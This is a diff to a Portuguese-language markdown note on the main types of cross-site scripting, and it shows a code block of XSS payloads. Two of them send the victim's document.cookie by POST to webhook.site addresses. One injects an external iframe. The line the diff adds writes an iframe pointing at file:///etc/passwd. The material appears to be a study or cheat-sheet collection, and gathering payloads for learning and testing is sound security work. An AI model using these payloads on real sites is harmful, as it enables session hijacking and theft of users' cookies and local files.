@@ -21,8 +21,7 @@ Existem **três tipos principais** de vulnerabilidades XSS:
 <img src=x onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
 <script>fetch("https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1",{method:'POST',body:'cookie='+document.cookie});</script>
 <img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
-<img width="782" height="392" alt="image" src="https://github.com/user-attachments/assets/d9a45e39-95dd-4475-a46e-fc69f2c4c60c" />
-
+<img src="echopwn" onerror​="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 
 ```
 Ferramenta útil: [URL/HTML Decoder - Eric Meyer](https://meyerweb.com/eric/tools/dencoder/)
